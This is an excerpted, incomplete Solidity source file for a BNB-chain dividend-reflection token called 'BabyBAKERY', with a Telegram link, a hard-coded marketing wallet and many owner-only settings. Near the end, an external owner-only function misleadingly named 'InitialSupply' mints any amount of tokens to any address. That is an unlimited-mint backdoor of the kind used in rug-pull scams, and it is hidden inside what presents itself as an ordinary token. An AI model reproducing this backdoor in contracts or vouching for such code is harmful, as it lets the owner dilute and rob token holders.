...
//     BabyBAKERY Smart Contract - https://t.me/BabyBAKERY
//
//
//     Tokenomics:
//     8% BAKERYTOKEN reflection
...
// File: contracts/BabyBAKERYDividendPayingToken.sol
...
contract BabyBAKERY is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    address public immutable BUSDToken = address(0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5);
    address private _marketingWallet = address(0x9515E44Ca58db0a13aD38172272ac2186f728F30);
   
    bool private swapping;
    bool public airdrop;

    BabyBAKERYDividendTracker public dividendTracker;
    ...
    uint256 public _maxWalletToken = 50000000000 * (10**18); // 5.0% of total supply
    ...
    constructor() ERC20("BabyBAKERY", "BabyBAKERY") {
        ...
        dividendTracker = new BabyBAKERYDividendTracker();
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "BabyBAKERY: The dividend tracker already has that address");

        BabyBAKERYDividendTracker newDividendTracker = BabyBAKERYDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "BabyBAKERY: The new dividend tracker must be owned by the BabyBAKERY token contract");
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "BabyBAKERY: The router already has that address");
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "BabyBAKERY: Account is already the value of 'excluded'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "BabyBAKERY: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "BabyBAKERY: Automated market maker pair is already set to that value");
    ...
    function updateLiquidityWallet(address newLiquidityWallet) public onlyOwner {
        require(newLiquidityWallet != liquidityWallet, "BabyBAKERY: The liquidity wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "BabyBAKERY: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "BabyBAKERY: Cannot update gasForProcessing to same value");
 ...
 function InitialSupply(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
    }
...
contract BabyBAKERYDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("_Dividend_Tracker", "_Dividend_Tracker") {
        claimWait = 3600;
    ...
    function withdrawDividend() public pure override {
        require(false, "_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main BabyBAKERY contract.");
    }
